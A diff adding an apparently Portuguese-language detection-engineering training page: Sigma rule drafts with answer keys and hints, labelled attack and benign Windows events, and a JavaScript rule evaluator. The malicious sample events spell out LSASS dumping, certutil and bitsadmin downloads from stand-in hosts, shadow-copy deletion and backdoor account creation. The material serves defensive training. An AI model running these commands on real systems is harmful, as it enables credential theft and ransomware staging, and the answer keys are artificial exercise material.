+   "rascunho": "title: Dump da memória do LSASS com ProcDump\nid: 6f1c2a10-46a1-4d1e-9a01-7c3b2e9d1003\nstatus: experimental\ndescription: Rascunho herdado do SIEM antigo. Ninguém testou desde 2024.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.credential-access\n  - attack.t1003.001\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - '\\procdump.exe'\n      - '\\procdump64.exe'\n  condition: selection\nfalsepositives:\n  - Desconhecidos\nlevel: high\n",
+   "gabarito": "title: Dump da memória do LSASS por linha de comando\nid: 6f1c2a10-46a1-4d1e-9a01-7c3b2e9d1003\nstatus: test\ndescription: Detecta o dump do LSASS com ProcDump, mesmo renomeado, ou com comsvcs.dll MiniDump.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.credential-access\n  - attack.t1003.001\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection_dump:\n    CommandLine|contains|all:\n      - ' -ma '\n      - 'lsass'\n  selection_comsvcs:\n    CommandLine|contains|all:\n      - 'comsvcs'\n      - 'minidump'\n  condition: 1 of selection_*\nfalsepositives:\n  - Suporte do fabricante coletando dump do LSASS com autorização registrada\nlevel: high\n",
+   "dica": "O nome do executável engana: o atacante renomeia o ProcDump e também usa o comsvcs.dll, que já vem no Windows. Detecte o comportamento na linha de comando: ' -ma ' junto com 'lsass' (modificador |contains|all) numa seleção, 'comsvcs' com 'minidump' em outra, e condition: 1 of selection_*.",
+   "esperado_rascunho": {
+    "vp": 1,
+    "fp": 1,
+    "fn": 2,
+    "volume": 1
+   }
+  },
+  {
+   "id": "T1558.003",
+   "nome": "Steal or Forge Kerberos Tickets: Kerberoasting",
+   "tatica": "TA0006",
+   "bancada": true,
+   "rascunho": "title: Kerberoasting\nid: b2c8e4f0-7a3d-4e19-a5c2-0f6d8b3a1558\nstatus: experimental\ndescription: Pedido de ticket de serviço Kerberos.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.credential-access\n  - attack.t1558.003\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4769\n  condition: selection\nfalsepositives:\n  - Desconhecidos\nlevel: medium\n",
+   "gabarito": "title: Ticket de serviço Kerberos com RC4 para conta de usuário\nid: b2c8e4f0-7a3d-4e19-a5c2-0f6d8b3a1558\nstatus: test\ndescription: Detecta pedidos de ticket de serviço com criptografia RC4 (0x17) para contas de serviço que não são de máquina.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.credential-access\n  - attack.t1558.003\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4769\n    TicketEncryptionType: '0x17'\n  filter_maquina:\n    ServiceName|endswith: '$'\n  filter_krbtgt:\n    ServiceName: 'krbtgt'\n  condition: selection and not 1 of filter_*\nfalsepositives:\n  - Aplicação legada que só fala RC4 com uma conta de serviço (documentar e filtrar pela conta)\nlevel: high\n",
+   "dica": "O evento 4769 acontece milhares de vezes por dia: todo acesso a serviço gera um. O sinal do Kerberoasting é o ticket com RC4 (TicketEncryptionType '0x17'). Depois, exclua com filtros estreitos as contas de máquina (ServiceName|endswith: '$') e o krbtgt, usando condition: selection and not 1 of filter_*.",
+   "esperado_rascunho": {
+    "vp": 2,
+    "fp": 3,
+    "fn": 0,
+    "volume": 9350
+   }
+  },
+  {
+   "id": "T1105",
+   "nome": "Ingress Tool Transfer",
+   "tatica": "TA0011",
+   "bancada": true,
+   "rascunho": "title: Uso do certutil\nid: c5f1a9d3-8e2b-4b07-9d4e-2a6c0e8f1105\nstatus: experimental\ndescription: Rascunho herdado do SIEM antigo.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.command-and-control\n  - attack.t1105\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n  condition: selection\nfalsepositives:\n  - Desconhecidos\nlevel: medium\n",
+   "gabarito": "title: Download de ferramenta com certutil ou bitsadmin\nid: c5f1a9d3-8e2b-4b07-9d4e-2a6c0e8f1105\nstatus: test\ndescription: Detecta binários nativos usados para baixar arquivos da internet.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.command-and-control\n  - attack.t1105\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  sel_certutil:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains:\n      - 'urlcache'\n      - 'verifyctl'\n  sel_bitsadmin:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains: '/transfer'\n  condition: 1 of sel_*\nfalsepositives:\n  - Script de TI antigo que baixa instaladores com bitsadmin\nlevel: high\n",
+   "dica": "O certutil também é usado para conferir hashes, e o atacante tem outros binários nativos de download. Exija 'urlcache' ou 'verifyctl' na linha de comando do certutil e crie uma segunda seleção para bitsadmin com '/transfer'. Junte as duas com condition: 1 of sel_*.",
+   "esperado_rascunho": {
+    "vp": 1,
+    "fp": 1,
+    "fn": 1,
+    "volume": 5
+   }
+  },
+  {
+   "id": "T1071.004",
+   "nome": "Application Layer Protocol: DNS",
+   "tatica": "TA0011",
+   "bancada": false,
+   "motivo": "Os logs de DNS não são coletados (veja o Estudo 48). É débito de detecção: primeiro a telemetria, depois a regra."
+  },
+  {
+   "id": "T1490",
+   "nome": "Inhibit System Recovery",
+   "tatica": "TA0040",
+   "bancada": true,
+   "rascunho": "title: Exclusão de cópias de sombra\nid: d8a3f6b2-1c9e-4d7a-b0f5-3e7a9c2d1490\nstatus: experimental\ndescription: Regra escrita às pressas depois de um incidente.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.impact\n  - attack.t1490\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    CommandLine|contains|all:\n      - 'vssadmin'\n      - 'delete'\n      - 'shadows'\n  condition: selection\nfalsepositives:\n  - Desconhecidos\nlevel: critical\n",
+   "gabarito": "title: Destruição das opções de recuperação do Windows\nid: d8a3f6b2-1c9e-4d7a-b0f5-3e7a9c2d1490\nstatus: test\ndescription: Detecta a exclusão de cópias de sombra e a desativação da recuperação, comuns antes do ransomware.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.impact\n  - attack.t1490\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  sel_vssadmin:\n    CommandLine|contains|all:\n      - 'vssadmin'\n      - 'delete'\n      - 'shadows'\n  sel_wmic:\n    CommandLine|contains|all:\n      - 'shadowcopy'\n      - 'delete'\n  sel_bcdedit:\n    CommandLine|contains|all:\n      - 'bcdedit'\n      - 'recoveryenabled'\n      - 'no'\n  condition: 1 of sel_*\nfalsepositives:\n  - Administrador removendo cópias de sombra antigas manualmente (raro; confirmar com a pessoa)\nlevel: critical\n",
+   "dica": "A regra nunca disparou e ninguém percebeu: o logsource aponta para o log Security, mas linha de comando de processo vem de process_creation (Sysmon 1 ou evento 4688). Corrija o logsource e cubra também 'wmic shadowcopy delete' e 'bcdedit ... recoveryenabled no', em seleções separadas com 1 of sel_*.",
+   "esperado_rascunho": {
+    "vp": 0,
+    "fp": 0,
+    "fn": 3,
+    "volume": 0
+   }
+  }
+ ],
+ "modelo_vazio": "title: Nova regra\nid: 00000000-0000-0000-0000-000000000000\nstatus: experimental\ndescription: Descreva o comportamento que a regra detecta.\nauthor: Seu nome\ntags:\n  - attack.persistence\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'TROQUE-ISTO'\n  condition: selection\nfalsepositives:\n  - Liste o que pode disparar sem ataque\nlevel: medium\n",
+ "eventos": [
+  {
+   "id": "m01",
+   "rotulo": "malicioso",
+   "tecnica": "T1003.001",
+   "resumo": "Dump do LSASS com comsvcs.dll (binário nativo do Windows)",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-FIN-07",
+    "User": "CORP\\joao.lima",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\m.dmp full",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m02",
+   "rotulo": "malicioso",
+   "tecnica": "T1003.001",
+   "resumo": "ProcDump renomeado para pd.exe",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Users\\Public\\pd.exe",
+    "CommandLine": "pd.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m03",
+   "rotulo": "malicioso",
+   "tecnica": "T1003.001",
+   "resumo": "ProcDump com o nome original",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\procdump64.exe",
+    "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\o.dmp",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m04",
+   "rotulo": "malicioso",
+   "tecnica": "T1558.003",
+   "resumo": "Ticket de serviço RC4 pedido para svc_sql por estação comprometida",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4769,
+    "TargetUserName": "joao.lima@CORP.IPESTORE.EXAMPLE",
+    "ServiceName": "svc_sql",
+    "TicketEncryptionType": "0x17",
+    "IpAddress": "10.20.5.33"
+   }
+  },
+  {
+   "id": "m05",
+   "rotulo": "malicioso",
+   "tecnica": "T1558.003",
+   "resumo": "Ticket de serviço RC4 pedido para svc_backup, segundos depois",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4769,
+    "TargetUserName": "joao.lima@CORP.IPESTORE.EXAMPLE",
+    "ServiceName": "svc_backup",
+    "TicketEncryptionType": "0x17",
+    "IpAddress": "10.20.5.33"
+   }
+  },
+  {
+   "id": "m06",
+   "rotulo": "malicioso",
+   "tecnica": "T1053.005",
+   "resumo": "Tarefa no logon executando binário em C:\\Users\\Public",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-FIN-07",
+    "User": "CORP\\joao.lima",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks /create /tn \"AtualizadorAdobe\" /tr \"C:\\Users\\Public\\upd.exe\" /sc onlogon /f",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m07",
+   "rotulo": "malicioso",
+   "tecnica": "T1053.005",
+   "resumo": "Tarefa diária como SYSTEM rodando PowerShell oculto",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks.exe /Create /RU SYSTEM /SC DAILY /TN \"Manutencao\" /TR \"powershell.exe -w hidden -f C:\\ProgramData\\m.ps1\"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m08",
+   "rotulo": "malicioso",
+   "tecnica": "T1490",
+   "resumo": "Exclusão das cópias de sombra com vssadmin",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m09",
+   "rotulo": "malicioso",
+   "tecnica": "T1490",
+   "resumo": "Exclusão das cópias de sombra com WMIC",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+    "CommandLine": "wmic.exe shadowcopy delete /nointeractive",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m10",
+   "rotulo": "malicioso",
+   "tecnica": "T1490",
+   "resumo": "Desativação da recuperação automática do Windows",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Image": "C:\\Windows\\System32\\bcdedit.exe",
+    "CommandLine": "bcdedit /set {default} recoveryenabled no",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m11",
+   "rotulo": "malicioso",
+   "tecnica": "T1105",
+   "resumo": "Download de ferramenta com certutil",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-FIN-07",
+    "User": "CORP\\joao.lima",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.23/a.txt C:\\Users\\Public\\a.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m12",
+   "rotulo": "malicioso",
+   "tecnica": "T1105",
+   "resumo": "Download de ferramenta com bitsadmin",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-FIN-07",
+    "User": "CORP\\joao.lima",
+    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "CommandLine": "bitsadmin /transfer job1 /download /priority high http://cdn-atualiza.example/p.exe C:\\ProgramData\\p.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m13",
+   "rotulo": "malicioso",
+   "tecnica": "T1136.001",
+   "resumo": "Conta local criada para manter acesso",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net user suporte.ti Ipe@2026! /add",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "m14",
+   "rotulo": "malicioso",
+   "tecnica": "T1136.001",
+   "resumo": "Conta local com nome que imita conta de máquina",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Image": "C:\\Windows\\System32\\net1.exe",
+    "CommandLine": "net1 user backup$ Bkp!2026 /add /expires:never",
+    "ParentImage": "C:\\Windows\\System32\\net.exe"
+   }
+  },
+  {
+   "id": "b01",
+   "rotulo": "benigno",
+   "frequencia_dia": 1,
+   "resumo": "Desenvolvedora coleta dump do IIS para investigar travamento",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-WEB01",
+    "User": "CORP\\ana.dev",
+    "Image": "C:\\Tools\\procdump64.exe",
+    "CommandLine": "procdump64.exe -accepteula -ma w3wp.exe C:\\Dumps\\w3wp.dmp",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b02",
+   "rotulo": "benigno",
+   "frequencia_dia": 40,
+   "resumo": "Administrador lista tarefas agendadas",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\adm.carlos",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks /query /fo LIST /v",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b03",
+   "rotulo": "benigno",
+   "frequencia_dia": 15,
+   "resumo": "Atualizador do navegador recria sua tarefa",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-RH-02",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks /create /tn GoogleUpdateTaskMachineUA /tr \"\\\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\\\" /ua\" /sc hourly /f",
+    "ParentImage": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe"
+   }
+  },
+  {
+   "id": "b04",
+   "rotulo": "benigno",
+   "frequencia_dia": 24,
+   "resumo": "Agente de backup confere as cópias de sombra",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin list shadows",
+    "ParentImage": "C:\\Program Files\\BackupAgent\\agent.exe"
+   }
+  },
+  {
+   "id": "b05",
+   "rotulo": "benigno",
+   "frequencia_dia": 2,
+   "resumo": "Administrador consulta a configuração de boot",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "CORP\\adm.carlos",
+    "Image": "C:\\Windows\\System32\\bcdedit.exe",
+    "CommandLine": "bcdedit /enum",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b06",
+   "rotulo": "benigno",
+   "frequencia_dia": 5,
+   "resumo": "TI confere o hash de um instalador",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-TI-01",
+    "User": "CORP\\adm.carlos",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -hashfile instalador-erp.msi SHA256",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b07",
+   "rotulo": "benigno",
+   "frequencia_dia": 30,
+   "resumo": "RH consulta dados de uma conta do domínio",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-RH-02",
+    "User": "CORP\\paula.rh",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net user maria.souza /domain",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b08",
+   "rotulo": "benigno",
+   "frequencia_dia": 6,
+   "resumo": "TI lista os administradores locais",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-TI-01",
+    "User": "CORP\\adm.carlos",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net localgroup Administradores",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+   }
+  },
+  {
+   "id": "b09",
+   "rotulo": "benigno",
+   "frequencia_dia": 60,
+   "resumo": "Usuário instala a impressora do setor",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-FIN-07",
+    "User": "CORP\\joao.lima",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe printui.dll,PrintUIEntry /in /n \\\\SRV-IMP01\\Financeiro",
+    "ParentImage": "C:\\Windows\\explorer.exe"
+   }
+  },
+  {
+   "id": "b10",
+   "rotulo": "benigno",
+   "frequencia_dia": 300,
+   "resumo": "Script de inventário agendado",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ERP01",
+    "User": "CORP\\svc_inventario",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventario.ps1",
+    "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+   }
+  },
+  {
+   "id": "b11",
+   "rotulo": "benigno",
+   "frequencia_dia": 5000,
+   "resumo": "Navegador abrindo a intranet",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "WS-RH-02",
+    "User": "CORP\\paula.rh",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://intranet.ipestore.example/",
+    "ParentImage": "C:\\Windows\\explorer.exe"
+   }
+  },
+  {
+   "id": "b12",
+   "rotulo": "benigno",
+   "frequencia_dia": 4,
+   "resumo": "Agente de backup lista as cópias de sombra via WMIC",
+   "logsource": {
+    "product": "windows",
+    "category": "process_creation"
+   },
+   "campos": {
+    "Computer": "SRV-ARQ02",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+    "CommandLine": "wmic.exe shadowcopy list brief",
+    "ParentImage": "C:\\Program Files\\BackupAgent\\agent.exe"
+   }
+  },
+  {
+   "id": "b13",
+   "rotulo": "benigno",
+   "frequencia_dia": 9000,
+   "resumo": "Ticket de serviço AES: o normal num domínio moderno",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4769,
+    "TargetUserName": "erp.app@CORP.IPESTORE.EXAMPLE",
+    "ServiceName": "svc_sql",
+    "TicketEncryptionType": "0x12",
+    "IpAddress": "10.20.1.15"
+   }
+  },
+  {
+   "id": "b14",
+   "rotulo": "benigno",
+   "frequencia_dia": 300,
+   "resumo": "Servidor legado que só negocia RC4 com a própria conta de máquina",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4769,
+    "TargetUserName": "SRV-LEGADO$@CORP.IPESTORE.EXAMPLE",
+    "ServiceName": "SRV-LEGADO$",
+    "TicketEncryptionType": "0x17",
+    "IpAddress": "10.20.1.40"
+   }
+  },
+  {
+   "id": "b15",
+   "rotulo": "benigno",
+   "frequencia_dia": 50,
+   "resumo": "Renovação de ticket do servidor legado (serviço krbtgt)",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4769,
+    "TargetUserName": "SRV-LEGADO$@CORP.IPESTORE.EXAMPLE",
+    "ServiceName": "krbtgt",
+    "TicketEncryptionType": "0x17",
+    "IpAddress": "10.20.1.40"
+   }
+  },
+  {
+   "id": "b16",
+   "rotulo": "benigno",
+   "frequencia_dia": 20000,
+   "resumo": "Logon de rede comum",
+   "logsource": {
+    "product": "windows",
+    "service": "security"
+   },
+   "campos": {
+    "Computer": "DC01",
+    "EventID": 4624,
+    "TargetUserName": "paula.rh",
+    "LogonType": 3,
+    "IpAddress": "10.20.3.21"
+   }
+  }
+ ],
+ "missoes": [
+  {
+   "id": "declarada",
+   "texto": "Rode todas as regras e compare a cobertura declarada (tenho regra) com a testada (a regra dispara)."
+  },
+  {
+   "id": "volume",
+   "texto": "Zere os falsos positivos da regra de Kerberoasting (T1558.003) sem perder nenhum ataque."
+  },
+  {
+   "id": "logsource",
+   "texto": "Descubra por que a regra de T1490 nunca disparou e aprove-a no pipeline."
+  },
+  {
+   "id": "do_zero",
+   "texto": "Escreva do zero a regra de T1136.001, com a tag ATT&CK, e aprove-a."
+  },
+  {
+   "id": "cobertura",
+   "texto": "Cubra as 6 técnicas da bancada."
+  }
+ ]
+}
+</script>
+
+<script>
+(function() {
+    var ED = JSON.parse(document.getElementById("ed-dados").textContent);
+    var MODS = ["contains", "startswith", "endswith", "all"];
+    var estado = {}, selecionada = null, feitas = {};
+
+    function el(tag, texto, estilo) {
+        var e = document.createElement(tag);
+        if (texto !== undefined && texto !== null) e.textContent = texto;
+        if (estilo) e.setAttribute("style", estilo);
+        return e;
+    }
+    function erroRegra(msg) { var e = new Error(msg); e.regra = true; return e; }
+    function ehMapa(v) { return v !== null && typeof v === "object" && !Array.isArray(v); }
+    function tecnica(id) { return ED.tecnicas.filter(function(t) { return t.id === id; })[0]; }
+    function bancada() { return ED.tecnicas.filter(function(t) { return t.bancada; }); }
+    function fmt(n) { return Number(n).toLocaleString("pt-BR"); }
+
+    // ===================================================== YAML (subconjunto, espelhado nos testes)
+    function tirarComentario(l) {
+        var aspas = null;
+        for (var i = 0; i < l.length; i++) {
+            var ch = l.charAt(i);
+            if (aspas) { if (ch === aspas) aspas = null; }
+            else if (ch === "'" || ch === '"') aspas = ch;
+            else if (ch === "#" && (i === 0 || l.charAt(i - 1) === " " || l.charAt(i - 1) === "\t")) return l.slice(0, i);
+        }
+        return l;
+    }
+    function dividirFluxo(s) {
+        var partes = [], atual = "", aspas = null;
+        for (var i = 0; i < s.length; i++) {
+            var ch = s.charAt(i);
+            if (aspas) { atual += ch; if (ch === aspas) aspas = null; }
+            else if (ch === "'" || ch === '"') { aspas = ch; atual += ch; }
+            else if (ch === ",") { partes.push(atual); atual = ""; }
+            else atual += ch;
+        }
+        partes.push(atual);
+        return partes.filter(function(p) { return p.trim() !== ""; });
+    }
+    function escalar(s) {
+        s = s.trim();
+        if (s.length >= 2 && s.charAt(0) === "'" && s.charAt(s.length - 1) === "'") return s.slice(1, -1).replace(/''/g, "'");
+        if (s.length >= 2 && s.charAt(0) === '"' && s.charAt(s.length - 1) === '"') return s.slice(1, -1).replace(/\\(["\\])/g, "$1");
+        if (s.charAt(0) === "[" && s.charAt(s.length - 1) === "]") return dividirFluxo(s.slice(1, -1)).map(escalar);
+        return s;
+    }
+    function ehItem(c) { return c === "-" || c.indexOf("- ") === 0; }
+    function separarChave(c, n) {
+        var aspas = null;
+        for (var i = 0; i < c.length; i++) {
+            var ch = c.charAt(i);
+            if (aspas) { if (ch === aspas) aspas = null; }
+            else if (ch === "'" || ch === '"') aspas = ch;
+            else if (ch === ":" && (i === c.length - 1 || c.charAt(i + 1) === " ")) {
+                var chave = escalar(c.slice(0, i));
+                if (typeof chave !== "string" || !chave) break;
+                return [chave, c.slice(i + 1).trim()];
+            }
+        }
+        throw erroRegra("linha " + n + ": esperado 'chave: valor'");
+    }
+    window.lerYamlSigma = function(texto) {
+        var linhas = [];
+        String(texto).split("\n").forEach(function(bruta, idx) {
+            var n = idx + 1;
+            var recuo = bruta.match(/^\s*/)[0];
+            if (recuo.indexOf("\t") !== -1) throw erroRegra("linha " + n + ": use espaços, não tabulação, na indentação");
+            var sem = tirarComentario(bruta).replace(/\s+$/, "");
+            if (!sem.trim()) return;
+            linhas.push([n, sem.match(/^ */)[0].length, sem.trim()]);
+        });
+        if (!linhas.length) throw erroRegra("a regra está vazia");
+        var pos = 0;
+        function bloco(ind) { return ehItem(linhas[pos][2]) ? lista(ind) : mapa(ind); }
+        function mapa(ind) {
+            var obj = {};
+            while (pos < linhas.length) {
+                var n = linhas[pos][0], i = linhas[pos][1], c = linhas[pos][2];
+                if (i < ind) break;
+                if (i > ind) throw erroRegra("linha " + n + ": indentação inesperada");
+                if (ehItem(c)) throw erroRegra("linha " + n + ": item de lista onde se esperava 'chave: valor'");
+                var kv = separarChave(c, n), k = kv[0], resto = kv[1];
+                if (Object.prototype.hasOwnProperty.call(obj, k)) throw erroRegra("linha " + n + ": chave '" + k + "' repetida");
+                pos++;
+                if (resto === "") {
+                    var prox = pos < linhas.length ? linhas[pos] : null;
+                    if (prox && prox[1] > ind) obj[k] = bloco(prox[1]);
+                    else if (prox && prox[1] === ind && ehItem(prox[2])) obj[k] = lista(ind);
+                    else obj[k] = null;
+                } else obj[k] = escalar(resto);
+            }
+            return obj;
+        }
+        function lista(ind) {
+            var arr = [];
+            while (pos < linhas.length) {
+                var n = linhas[pos][0], i = linhas[pos][1], c = linhas[pos][2];
+                if (i < ind || (i === ind && !ehItem(c))) break;
+                if (i > ind) throw erroRegra("linha " + n + ": indentação inesperada");
+                var item = c.slice(1).trim();
+                pos++;
+                if (item === "") {
+                    var prox = pos < linhas.length ? linhas[pos] : null;
+                    arr.push(prox && prox[1] > ind ? bloco(prox[1]) : null);
+                } else arr.push(escalar(item));
+            }
+            return arr;
+        }
+        var raiz = bloco(linhas[0][1]);
+        if (pos < linhas.length) throw erroRegra("linha " + linhas[pos][0] + ": indentação inesperada");
+        if (!ehMapa(raiz)) throw erroRegra("a regra precisa ser um mapa de chaves (title, logsource, detection...)");
+        return raiz;
+    };
+
+    // ===================================================== avaliador Sigma (espelhado nos testes)
+    function curinga(padrao) {
+        return new RegExp("^" + String(padrao).toLowerCase().split("*").map(function(p) { return p.replace(/[.+?^${}()|[\]\\]/g, "\\$&"); }).join(".*") + "$");
+    }
+    function compilarCondicao(cond, nomes) {
+        var tokens = String(cond).match(/\(|\)|[^\s()]+/g) || [];
+        var pos = 0;
+        function ver() { return pos < tokens.length ? tokens[pos].toLowerCase() : null; }
+        function pegar() { if (pos >= tokens.length) throw erroRegra("condition termina antes do esperado"); return tokens[pos++]; }
+        function ou() {
+            var a = e_();
+            while (ver() === "or") { pegar(); var b = e_(); a = (function(p, q) { return function(r) { return p(r) || q(r); }; })(a, b); }
+            return a;
+        }
+        function e_() {
+            var a = nao();
+            while (ver() === "and") { pegar(); var b = nao(); a = (function(p, q) { return function(r) { return p(r) && q(r); }; })(a, b); }
+            return a;
+        }
+        function nao() {
+            if (ver() === "not") { pegar(); var a = nao(); return function(r) { return !a(r); }; }
+            return prim();
+        }
+        function prim() {
+            var t = pegar();
+            if (t === "(") { var v = ou(); if (pegar() !== ")") throw erroRegra("parêntese não fechado na condition"); return v; }
+            if (t === ")") throw erroRegra("parêntese fechado sem abrir na condition");
+            var tl = t.toLowerCase();
